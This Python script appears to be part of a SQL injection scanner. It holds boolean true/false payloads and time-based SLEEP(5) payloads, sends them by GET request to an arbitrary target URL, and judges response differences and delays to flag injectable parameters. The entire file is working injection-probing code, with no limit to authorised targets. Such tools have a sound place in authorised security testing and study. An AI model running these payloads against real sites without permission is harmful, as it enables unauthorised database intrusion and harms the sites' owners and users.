from url_utils import construct_test_url
from response_analyzer import analyze_response
import requests
import time

# SQL injection payloads for testing
test_1_payloads = [" AND 1=1", "' AND '1'='1", '" AND "1"="1']
test_2_payloads = [" AND 1=2", "' AND '1'='2", '" AND "1"="2']
time_based_payloads = [" AND SLEEP(5)", "' AND SLEEP(5)%23", '" AND SLEEP(5)%23']


# Function to send SQL payloads and receive the response
def send_payload(target_url):
    response = requests.get(target_url)
    return response.text


# Function to test SQL injection
def test_sql_injection(target_url, id_value):
    print(f"\nTesting default request: {target_url}")
    default_response = send_payload(target_url)
    print("Default response length:", len(default_response))

    # Test 1: True conditions
    print("\nTesting with True conditions (Test 1):")
    true_responses = []  # To store true responses for further comparison
    for payload in test_1_payloads:
        new_url = construct_test_url(target_url, id_value, payload)
        response = send_payload(new_url)
        analyze_response(default_response, response, payload)
        true_responses.append(response)  # Store the response for true conditions

    # Test 2: False conditions
    print("\nTesting with False conditions (Test 2):")
    for payload in test_2_payloads:
        new_url = construct_test_url(target_url, id_value, payload)
        response = send_payload(new_url)

        # Ensure false condition responses differ from both default and true condition responses
        if any(response == true_response for true_response in true_responses):
            print(f"Payload '{payload}' produced a similar response to true conditions (unexpected result).")
        else:
            analyze_response(default_response, response, payload)

    # Test 3: Time-based blind conditions
    print("\nTesting with Time-based conditions (Test 3):")
    for payload in time_based_payloads:
        new_url = construct_test_url(target_url, id_value, payload)
        start_time = time.time()
        send_payload(new_url)  # We don't need the response text, just the time taken
        response_time = time.time() - start_time

        # Check if response time indicates delay
        if response_time > 4:  # Adjust threshold as needed, here set to 4 seconds
            print(f"Payload '{payload}' caused a significant delay (likely vulnerable to time-based injection).")
        else:
            print(f"Payload '{payload}' did not cause a significant delay (likely not vulnerable to time-based "
                  f"injection).")
